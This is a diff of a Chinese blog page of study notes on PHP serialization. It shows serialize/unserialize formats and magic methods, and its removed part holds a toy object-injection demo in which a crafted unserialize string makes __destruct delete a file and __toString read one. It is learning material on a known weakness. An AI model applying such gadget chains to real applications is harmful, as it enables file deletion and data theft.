@@ -1,857 +1,505 @@
 <!DOCTYPE html>
-<html>
+
+
+  <html class="light page-post">
+
+
 <head>
-    <meta charset="utf-8">
-    
-    <title>PHP序列化学习总结 | 可会知</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-        <meta name="keywords" content="php,session,对象" />
-    
-    <meta name="description" content="序列化函数
+  <meta charset="utf-8">
+  
+  <title>PHP序列化学习总结 | 可会知</title>
 
-serialize()：返回带有变量类型和值的字符串unserialize()：想要将已序列化的字符串变回 PHP 的值
-测试代码：
-class test{
-    var $a;
-    var $b;
-    function __construct($a,$b,$c){
-        $a  = $a;
-        $this-&amp;gt;b = $b;
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-    }
-}">
+  
+    <meta name="keywords" content="kovige,PHP,session,对象," />
+  
+
+  <meta name="description" content="前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP序列化学习总结">
-<meta property="og:url" content="https://kovige.github.io/2016/08/17/PHP序列化学习总结/index.html">
+<meta property="og:url" content="https://kovige.github.io/2016/08/25/PHP序列化学习总结/index.html">
 <meta property="og:site_name" content="可会知">
-<meta property="og:description" content="序列化函数
-
-serialize()：返回带有变量类型和值的字符串unserialize()：想要将已序列化的字符串变回 PHP 的值
-测试代码：
-class test{
-    var $a;
-    var $b;
-    function __construct($a,$b,$c){
-        $a  = $a;
-        $this-&amp;gt;b = $b;
-
-    }
-}">
-<meta property="og:image" content="https://kovige.github.io/./md2_images/1468567761183.jpg">
-<meta property="og:updated_time" content="2016-08-17T09:49:04.370Z">
+<meta property="og:description" content="前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。">
+<meta property="og:image" content="https://kovige.github.io/md2_images/obj.png">
+<meta property="og:image" content="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468567761183.jpg">
+<meta property="og:image" content="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468571622855.jpg">
+<meta property="og:image" content="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468571947277.jpg">
+<meta property="og:image" content="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468572495614.jpg">
+<meta property="og:image" content="https://kovige.github.io/2016/08/17/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/md2_images/1468572538300.jpg">
+<meta property="og:updated_time" content="2016-08-26T09:39:48.617Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PHP序列化学习总结">
-<meta name="twitter:description" content="序列化函数
+<meta name="twitter:description" content="前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。">
+<meta name="twitter:image" content="https://kovige.github.io/md2_images/obj.png">
 
-serialize()：返回带有变量类型和值的字符串unserialize()：想要将已序列化的字符串变回 PHP 的值
-测试代码：
-class test{
-    var $a;
-    var $b;
-    function __construct($a,$b,$c){
-        $a  = $a;
-        $this-&amp;gt;b = $b;
+  
 
-    }
-}">
-<meta name="twitter:image" content="https://kovige.github.io/./md2_images/1468567761183.jpg">
-    
+  
+    <link rel="icon" href="/tgl.ico">
+  
 
-    
-        <link rel="alternate" href="/" title="可会知" type="application/atom+xml" />
-    
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
 
-    
 
-    <link rel="stylesheet" href="/vendor/font-awesome/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/vendor/titillium-web/styles.css">
-    <link rel="stylesheet" href="/vendor/source-code-pro/styles.css">
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
 
-    <link rel="stylesheet" href="/css/style.css">
+  
 
-    <script src="/vendor/jquery/2.0.3/jquery.min.js"></script>
-    
-    
-        <link rel="stylesheet" href="/vendor/fancybox/jquery.fancybox.css">
-    
-    
-        <link rel="stylesheet" href="/vendor/scrollLoading/style.css">
-    
-    
-    
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
 
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
 </head>
 
 <body>
-    <div id="wrap">
-        <header id="header">
-    <div id="header-outer" class="outer">
-        <div class="container">
-            <div class="container-inner">
-                <div id="header-title">
-                    <h1 class="logo-wrap">
-                        <a href="/" class="logo"></a>
-                    </h1>
-                    
-                </div>
-                <div id="header-inner" class="nav-container">
-                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
-                    <div class="nav-container-inner">
-                        <ul id="main-nav">
-                            
-                                <li class="main-nav-list-item" >
-                                    <a class="main-nav-list-link" href="/">Home</a>
-                                </li>
-                            
-                                        
-                                    
-                                <li class="main-nav-list-item" >
-                                    <a class="main-nav-list-link" href="/about/index.html">About</a>
-                                </li>
-                            
-                        </ul>
-                        <nav id="sub-nav">
-                            <div id="search-form-wrap">
 
-    <form class="search-form">
-        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
-        <button type="submit" class="search-form-submit"></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..." />
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/atom.xml"
+            rel="noopener noreferrer"
+            target="_blank"
+            >
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">Posts List</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-序列化函数"><span class="toc-text">0x00 序列化函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-对象序列化"><span class="toc-text">0x01 对象序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PHP序列化的利用"><span class="toc-text">0x02 PHP序列化的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、magic函数和序列化"><span class="toc-text">1、magic函数和序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、三个白帽挑战赛第三期"><span class="toc-text">2、三个白帽挑战赛第三期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、安恒ctf-web3"><span class="toc-text">3、安恒ctf web3</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-PHP序列化学习总结" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">PHP序列化学习总结</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2016.08.25</span>
+      </span>
+
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/安全笔记/">安全笔记</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://kovige.github.io/2016/08/25/PHP序列化学习总结/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+
+      
+      
     </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: 'Posts',
-            PAGES: 'Pages',
-            CATEGORIES: 'Categories',
-            TAGS: 'Tags',
-            UNTITLED: '(Untitled)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '/content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-<script src="/js/insight.js"></script>
+  </header>
 
-</div>
-                        </nav>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</header>
-        <div class="container">
-            <div class="main-body container-inner">
-                <div class="main-body-inner">
-                    <section id="main">
-                        <div class="main-body-header">
-    <h1 class="header">
+  <div class="article-content">
     
-    uncategorized
-    </h1>
-</div>
-                        <div class="main-body-content">
-                            <article id="post-PHP序列化学习总结" class="article article-single article-type-post" itemscope itemprop="blogPost">
-    <div class="article-inner">
-        
-            <header class="article-header">
-                
-    
-        <h1 class="article-title" itemprop="name">
-        PHP序列化学习总结
-        </h1>
-    
-
-            </header>
-        
-        
-            <div class="article-subtitle">
-                <a href="/2016/08/17/PHP序列化学习总结/" class="article-date">
-    <time datetime="2016-08-17T08:44:33.862Z" itemprop="datePublished">2016-08-17</time>
-</a>
-                
-    <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php-session-对象/">php,session,对象</a></li></ul>
-
-            </div>
-        
-        <div class="article-entry" itemprop="articleBody">
-            <blockquote>
-<p><strong>序列化函数</strong></p>
-</blockquote>
-<p><strong>serialize()</strong>：返回带有变量类型和值的字符串<br><strong>unserialize()</strong>：想要将已序列化的字符串变回 PHP 的值</p>
-<p>测试代码：</p>
-<pre><code>class test{
-    var $a;
-    var $b;
-    function __construct($a,$b,$c){
-        $a  = $a;
-        $this-&gt;b = $b;
-
-    }
-}
-
-class test1 extends test{
-
-     function __construct($a){
-         $this-&gt;a = $a;
-     }
- }
-$a = &apos;hello&apos;;
-$b = 123;
-$c = false;
-$d = new test(&apos;helloa&apos;,&apos;hellob&apos;,&apos;helloc&apos;);
-$e = new test1(&apos;hello&apos;);
-
-var_dump(serialize($a));
-var_dump(serialize($b));
-var_dump(serialize($c));
-var_dump(serialize($d));
-var_dump(serialize($e));
-</code></pre><p>运行结果：</p>
-<pre><code>string &apos;s:5:&quot;hello&quot;;&apos; (length=12)
-string &apos;i:123;&apos; (length=6)
-string &apos;b:0;&apos; (length=4)
-string &apos;O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:6:&quot;hellob&quot;;}&apos; (length=46)
-string &apos;O:5:&quot;test1&quot;:2:{s:1:&quot;a&quot;;s:5:&quot;hello&quot;;s:1:&quot;b&quot;;N;}&apos; (length=46)
-</code></pre><p>序列化字符串格式：==变量类型：变量长度：变量内容==。<br>如果序列化的是一个对象，序列化字符串格式为：<br>==变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝==</p>
-<p>将上述结果反序列化输出，执行结果：</p>
-<pre><code>string &apos;hello&apos; (length=5)
-int 123
-boolean false
-object(test)[1]
-  public &apos;a&apos; =&gt; null
-  public &apos;b&apos; =&gt; string &apos;hellob&apos; (length=6)
-object(test1)[1]
-  public &apos;a&apos; =&gt; string &apos;hello&apos; (length=5)
-  public &apos;b&apos; =&gt; null
-</code></pre><blockquote>
-<p><strong>对象序列化</strong></p>
-</blockquote>
-<p>当序列化对象时，PHP 将在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 </strong>wakeup() 成员函数。</p>
+      <!-- 这里是文章头部的图片 大小为800px*200px左右-->
+<p><img src="https://kovige.github.io/md2_images/obj.png" alt=""><br><!-- 这里是简单的介绍，50-100字 --></p>
+<p>前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。</p>
+<a id="more"></a>
+<h2 id="0x00-序列化函数"><a href="#0x00-序列化函数" class="headerlink" title="0x00 序列化函数"></a>0x00 序列化函数</h2><p><strong>serialize()</strong>：返回带有变量类型和值的字符串<br><strong>unserialize()</strong>：想要将已序列化的字符串变回 PHP 的值</p>
+<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">    	<span class="keyword">var</span> $a;</div><div class="line">    	<span class="keyword">var</span> $b;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a,$b,$c)</span></span>&#123;</div><div class="line">    		$a  = $a;</div><div class="line">    		<span class="keyword">$this</span>-&gt;b = $b;</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</div><div class="line">    </div><div class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</div><div class="line">     		<span class="keyword">$this</span>-&gt;a = $a;</div><div class="line">     	&#125;</div><div class="line">     &#125;</div><div class="line">    $a = <span class="string">'hello'</span>;</div><div class="line">    $b = <span class="number">123</span>;</div><div class="line">    $c = <span class="keyword">false</span>;</div><div class="line">    $d = <span class="keyword">new</span> test(<span class="string">'helloa'</span>,<span class="string">'hellob'</span>,<span class="string">'helloc'</span>);</div><div class="line">    $e = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</div><div class="line">    </div><div class="line">    var_dump(serialize($a));</div><div class="line">    var_dump(serialize($b));</div><div class="line">    var_dump(serialize($c));</div><div class="line">    var_dump(serialize($d));</div><div class="line">    var_dump(serialize($e));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>运行结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">string <span class="string">'s:5:"hello";'</span> (length=<span class="number">12</span>)</div><div class="line">string <span class="string">'i:123;'</span> (length=<span class="number">6</span>)</div><div class="line">string <span class="string">'b:0;'</span> (length=<span class="number">4</span>)</div><div class="line">string <span class="string">'O:4:"test":2:&#123;s:1:"a";N;s:1:"b";s:6:"hellob";&#125;'</span> (length=<span class="number">46</span>)</div><div class="line">string <span class="string">'O:5:"test1":2:&#123;s:1:"a";s:5:"hello";s:1:"b";N;&#125;'</span> (length=<span class="number">46</span>)</div></pre></td></tr></table></figure>
+<p>序列化字符串格式：<strong>变量类型：变量长度：变量内容</strong>。<br>如果序列化的是一个对象，序列化字符串格式为：<br><strong>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝</strong></p>
+<p>将上述结果反序列化输出，执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">string <span class="string">'hello'</span> (length=<span class="number">5</span>)</div><div class="line">int <span class="number">123</span></div><div class="line">boolean <span class="keyword">false</span></div><div class="line">object(test)[<span class="number">1</span>]</div><div class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; <span class="keyword">null</span></div><div class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hellob'</span> (length=<span class="number">6</span>)</div><div class="line">object(test1)[<span class="number">1</span>]</div><div class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hello'</span> (length=<span class="number">5</span>)</div><div class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; <span class="keyword">null</span></div></pre></td></tr></table></figure></p>
+<h2 id="0x01-对象序列化"><a href="#0x01-对象序列化" class="headerlink" title="0x01 对象序列化"></a>0x01 对象序列化</h2><p>当序列化对象时，PHP 将在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用</strong>wakeup()成员函数。</p>
 <p>在serialize()函数执行时，会先检查类中是否定义了<strong>sleep()函数，如果存在，则首先调用</strong>sleep()函数，如果不存在，就保留序列字符串中的所有属性。</p>
 <p>在unserialize()函数执行时，会先检查是否定义了<strong>wakeup()函数。如果</strong>wakeup()存在，将执行__wakeup()函数，会使变量被重新赋值。</p>
 <p>serialize()测试代码：</p>
-<pre><code>class test{
-    var $a;
-    var $b;
-    function __construct($a,$b,$c){
-        $this-&gt;a  = $a;
-        $this-&gt;b = $b;
-
-    }
-    function __sleep(){
-        echo &quot;b has changed&quot;.&quot;\n&quot;;
-        $this-&gt;b = &apos;hib&apos;;
-        return $this-&gt;b;
-
-
-    }
-    function __wakeup(){
-        echo &quot;a has changed&quot;.&quot;\n&quot;;
-        $this-&gt;a = &apos;hia&apos;;
-
-    }
-}
-
-class test1 extends test{
-
-     function __construct($a){
-         $this-&gt;a = $a;
-     }
- }
-
-$d = new test(&apos;helloa&apos;,&apos;hellob&apos;,&apos;helloc&apos;);
-$e = new test1(&apos;hello&apos;);
-
-serialize($d);
-serialize($e);
-
-var_dump($d);
-var_dump($e);
-</code></pre><p>执行结果：</p>
-<pre><code>   b has changed b has changed
-object(test)[1]
-  public &apos;a&apos; =&gt; string &apos;helloa&apos; (length=6)
-  public &apos;b&apos; =&gt; string &apos;hib&apos; (length=3)
-object(test1)[2]
-  public &apos;a&apos; =&gt; string &apos;hello&apos; (length=5)
-  public &apos;b&apos; =&gt; string &apos;hib&apos; (length=3)
-</code></pre><p>unserialize()测试代码：</p>
-<pre><code>class test{
-    var $a;
-    var $b;
-    function __construct($a,$b,$c){
-        $this-&gt;a  = $a;
-        $this-&gt;b = $b;
-
-    }
-    function __sleep(){
-        echo &quot;b has changed&quot;.&quot;\n&quot;;
-        $this-&gt;b = &apos;hib&apos;;
-        return $this-&gt;b;
-
-
-    }
-    function __wakeup(){
-        echo &quot;a has changed&quot;.&quot;\n&quot;;
-        $this-&gt;a = &apos;hia&apos;;
-
-    }
-}
-
-class test1 extends test{
-
-     function __construct($a){
-         $this-&gt;a = $a;
-     }
- }
-
-    $d = &apos;O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:6:&quot;hellob&quot;;}&apos; ;
-    $e = &apos;O:5:&quot;test1&quot;:2:{s:1:&quot;a&quot;;s:5:&quot;hello&quot;;s:1:&quot;b&quot;;N;}&apos; ;
-
-    var_dump(unserialize($d));
-    var_dump(unserialize($e));
-</code></pre><p>运行结果：</p>
-<pre><code>a has changed
-object(test)[1]
-  public &apos;a&apos; =&gt; string &apos;hia&apos; (length=3)
-  public &apos;b&apos; =&gt; string &apos;hellob&apos; (length=6)
-a has changed
-object(test1)[1]
-  public &apos;a&apos; =&gt; string &apos;hia&apos; (length=3)
-  public &apos;b&apos; =&gt; null
-</code></pre><blockquote>
-<p><strong>PHP序列化的利用</strong></p>
-</blockquote>
-<p><strong>1、magic函数和序列化</strong><br>除了<strong>sleep()和</strong>wakeup()函数，在序列化时会执行外，还有下面几种利用方式。</p>
-<pre><code> Class File
- {
-     function __construct($var,$file1,$file2){
-         $this-&gt;var = $var;
-         $this-&gt;file1 = $file1;
-         $this-&gt;file2 = $file2;
-         echo $this-&gt;var.&apos; and &apos;.$this-&gt;file1.&apos; and &apos;.$this-&gt;file2.&apos;defined&apos;;
-     }
-     function __destruct(){
-         unlink(dirname(__FILE__) . &apos;/&apos; . $this-&gt;file1);
-         echo $this-&gt;file1.&apos;deleted&apos;;
-     }
-     function __toString(){
-         return file_get_contents($this-&gt;file2);
-
-     }
-
-
- }
-
-// $file = new File(&apos;hello&apos;,&apos;123.txt&apos;,&apos;456.php&apos;);
-// var_dump(serialize($file));
-echo unserialize(&apos;O:4:&quot;File&quot;:3:{s:3:&quot;var&quot;;s:5:&quot;hello&quot;;s:5:&quot;file1&quot;;s:7:&quot;123.txt&quot;;s:5:&quot;file2&quot;;s:7:&quot;456.php&quot;;}&apos;);
-</code></pre><p>（<strong>construct()函数，在实例化一个对象时被调用，一般用来给属性赋值，</strong>destruct()在实例化对象完成后执行，__toString()函数在echo一个对象时被调用）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">    	<span class="keyword">var</span> $a;</div><div class="line">    	<span class="keyword">var</span> $b;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a,$b,$c)</span></span>&#123;</div><div class="line">    		<span class="keyword">$this</span>-&gt;a  = $a;</div><div class="line">    		<span class="keyword">$this</span>-&gt;b = $b;</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</div><div class="line">    		<span class="keyword">echo</span> <span class="string">"b has changed"</span>.<span class="string">"\n"</span>;</div><div class="line">    		<span class="keyword">$this</span>-&gt;b = <span class="string">'hib'</span>;</div><div class="line">    		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;b;</div><div class="line">    		</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">    		<span class="keyword">echo</span> <span class="string">"a has changed"</span>.<span class="string">"\n"</span>;</div><div class="line">    		<span class="keyword">$this</span>-&gt;a = <span class="string">'hia'</span>;</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</div><div class="line">    </div><div class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</div><div class="line">     		<span class="keyword">$this</span>-&gt;a = $a;</div><div class="line">     	&#125;</div><div class="line">     &#125;</div><div class="line">    </div><div class="line">    $d = <span class="keyword">new</span> test(<span class="string">'helloa'</span>,<span class="string">'hellob'</span>,<span class="string">'helloc'</span>);</div><div class="line">    $e = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</div><div class="line">    </div><div class="line">    serialize($d);</div><div class="line">    serialize($e);</div><div class="line">    </div><div class="line">    var_dump($d);</div><div class="line">    var_dump($e);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">b has changed b has changed</div><div class="line">object(test)[<span class="number">1</span>]</div><div class="line"><span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'helloa'</span> (length=<span class="number">6</span>)</div><div class="line"><span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hib'</span> (length=<span class="number">3</span>)</div><div class="line">object(test1)[<span class="number">2</span>]</div><div class="line"><span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hello'</span> (length=<span class="number">5</span>)</div><div class="line"><span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hib'</span> (length=<span class="number">3</span>)</div></pre></td></tr></table></figure></p>
+<p>unserialize()测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">    	<span class="keyword">var</span> $a;</div><div class="line">    	<span class="keyword">var</span> $b;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a,$b,$c)</span></span>&#123;</div><div class="line">    		<span class="keyword">$this</span>-&gt;a  = $a;</div><div class="line">    		<span class="keyword">$this</span>-&gt;b = $b;</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</div><div class="line">    		<span class="keyword">echo</span> <span class="string">"b has changed"</span>.<span class="string">"\n"</span>;</div><div class="line">    		<span class="keyword">$this</span>-&gt;b = <span class="string">'hib'</span>;</div><div class="line">    		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;b;</div><div class="line">    		</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">    		<span class="keyword">echo</span> <span class="string">"a has changed"</span>.<span class="string">"\n"</span>;</div><div class="line">    		<span class="keyword">$this</span>-&gt;a = <span class="string">'hia'</span>;</div><div class="line">    </div><div class="line">    	&#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</div><div class="line">    </div><div class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a)</span></span>&#123;</div><div class="line">     		<span class="keyword">$this</span>-&gt;a = $a;</div><div class="line">     	&#125;</div><div class="line">     &#125;</div><div class="line">    </div><div class="line">        $d = <span 